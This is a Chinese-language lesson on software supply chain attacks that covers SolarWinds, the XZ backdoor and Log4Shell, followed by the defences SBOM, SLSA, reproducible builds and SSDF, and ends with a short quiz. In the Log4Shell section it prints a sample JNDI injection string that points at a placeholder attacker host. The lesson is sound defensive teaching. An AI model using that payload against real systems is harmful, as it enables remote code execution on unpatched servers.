先備概念 1

什麼是「軟體供應鏈」？

🍜 餐廳很注意廚房衛生，但沒人檢查供應商送來的醬料。
醬料工廠一旦被動手腳，所有用這款醬料的餐廳一起中毒。

你寫的程式也一樣：它用到別人寫的函式庫、別人做的工具、別人發布的更新。這一整串「上游」，就是軟體供應鏈。

供應鏈攻擊：不直接攻擊你，而是污染你信任的上游，讓惡意程式跟著正常更新一起進來。

Wiki 依據：軟體供應鏈攻擊

先備概念 2

被攻破的不是程式，是「信任」

  • 信任簽章
    有官方簽章的更新，電腦就會放行。
  • 信任發布檔
    官網下載的安裝檔，很少人會再檢查內容。
  • 信任熱門套件
    大家都在用的元件，很少人會懷疑。

攻擊者只要拿下其中一環，就能一次影響所有下游使用者。

案例 1｜建置流程被入侵

SolarWinds：用官方憑證簽章的後門

  1. 攻擊者把惡意 DLL 放進 SolarWinds Orion 的軟體生命週期。
  2. 這個檔案由 SolarWinds 合法的程式碼簽章憑證簽署。
  3. 客戶照常安裝更新，後門連到偽裝成正常流量的網域，等待指令。
  • 開始時間
    至少 2020 年 3 月
  • 公開
    2020-12-13 美國 CISA 發布緊急指令，要求聯邦機關中斷受影響設備

Wiki 依據：SolarWinds

案例 2｜維護者身分被滲透

XZ 後門：維護者親手發布的後門

  • 取得發布權限的維護者帳號，在 xz 5.6.0 與 5.6.1 的發布檔中植入後門（CVE-2024-3094，CVSS 10.0）。
  • 觸發後門的程式碼從沒進過 Git，只在發布用的 tarball 裡；另一部分偽裝成測試檔。
  • 因為部分 Linux 發行版讓 SSH 伺服器間接連到這個壓縮函式庫，後門可能影響 SSH 登入。

🔍 怎麼被發現的？工程師注意到 SSH 登入變慢：0.30 秒 → 0.81 秒，追查後在 2024-03-29 公開。

Wiki 依據：XZ 後門

案例 3｜熱門元件有漏洞

Log4Shell：一行日誌就能執行程式

Log4j2 是 Java 的日誌函式庫，它會解析日誌內容中的特殊語法：

logger.info("登入失敗：" + username);

// 若 username 是（示意）：
//   ${jndi:ldap://attacker.example/x}
// 受影響的 Log4j2 會連到該 LDAP 伺服器，
// 載入並執行對方指定的程式
  • CVE-2021-44228，CVSS 10.0；2.0-beta9 起的版本受影響。
  • 修補了好幾輪，Java 8 以上請升到 2.17.1 以上。

防禦 1｜知道自己用了什麼

SBOM：軟體的成分表

🥫 食品有成分表，過敏的人一看就知道能不能吃。

SBOM（Software Bill of Materials）列出一個軟體由哪些元件組成。

  • 出事時第一個問題：「我們有沒有用到？」→ 查清單就知道。
  • 搭配 VEX：說明「有用到，但不一定受影響」，避免一律恐慌。

Wiki 依據：SBOM

防禦 2｜證明是怎麼做出來的

SLSA：分級的「產銷履歷」

等級白話防什麼
L0沒有履歷—
L1農夫自己手寫履歷發布流程出錯（但容易偽造）
L2公正檢驗所出具並蓋章建置完成後被竄改
L3檢驗所本身也有嚴格門禁建置過程中被竄改，含內部人員

Wiki 依據：SLSA

防禦 3｜任何人都能驗證

可重現建置

🎂 照著公開食譜做蛋糕，做出來跟店家賣的一模一樣，就能確定店家沒偷加東西。

同一份原始碼，任何人建置都得到完全相同的二進位檔 → 第三方可以驗證下載到的檔案沒被竄改。

⚠️ 限制：如果「原始碼」本身就有問題（像 XZ 的 tarball），重現出來的結果一樣有後門。還要比對發布檔和 Git 原始碼是否一致。

Wiki 依據：可重現建置

防禦 4｜從開發流程做起

SSDF：整間工廠的品管制度

美國 NIST 的安全軟體開發框架，分四組實務：

  • PO 準備組織
    人、流程、技術都準備好
  • PS 保護軟體
    元件不被竄改或未授權存取
  • PW 產出安全的軟體
    發布的版本漏洞最少
  • RV 回應漏洞
    處理發布後的漏洞、避免再發生

Wiki 依據：SSDF

小測驗

點開看答案

Q1. SolarWinds 的後門為什麼能通過客戶的檢查？

因為它由 SolarWinds 合法的程式碼簽章憑證簽署，看起來就是正常的官方更新。

Q2. 一個熱門元件爆出漏洞，組織第一個要回答的問題是什麼？靠什麼回答？

「我們有沒有用到它？」靠 SBOM（軟體成分表）快速查出來。

Q3. 只拿 XZ 的發布 tarball 做可重現建置，能發現後門嗎？

不能。tarball 本身就含有後門，重現的結果一樣有問題；要比對 tarball 和 Git 原始碼。

重點回顧

三句話帶走

  1. 供應鏈攻擊打的是信任：簽章、發布檔、熱門元件。
  2. 三種入口：建置流程、維護者身分、元件漏洞。
  3. 防禦要組合：SBOM 知道用了什麼、SLSA 與可重現建置證明沒被改、SSDF 從流程做起。
